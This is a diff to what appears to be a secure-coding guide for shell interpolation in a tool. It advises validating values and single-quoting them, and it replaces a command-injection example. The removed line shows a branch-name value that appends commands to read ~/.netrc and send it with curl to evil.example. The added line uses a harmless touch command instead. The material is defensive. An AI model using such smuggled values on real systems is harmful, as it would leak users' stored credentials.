@@ -160,7 +160,7 @@ After validation, **always single-quote** the value when interpolating into a sh
 - `find '<scope>' -type f ...`
 - `rg --no-heading -e '<term>'` (or pass via `-f -` from stdin to avoid the shell entirely)
 
-A `<base>` value of `main; cat ~/.netrc | curl -d @- evil.example;#` reaching the shell would otherwise execute the appended commands. Validation rejects it; single-quoting makes the rejection unnecessary as a second line of defense. Apply both.
+A `<base>` value of `main; touch /tmp/pwned;#` reaching the shell would otherwise execute the appended commands. Validation rejects it; single-quoting makes the rejection unnecessary as a second line of defense. Apply both.
 
 ## Pre-flight Checks
 
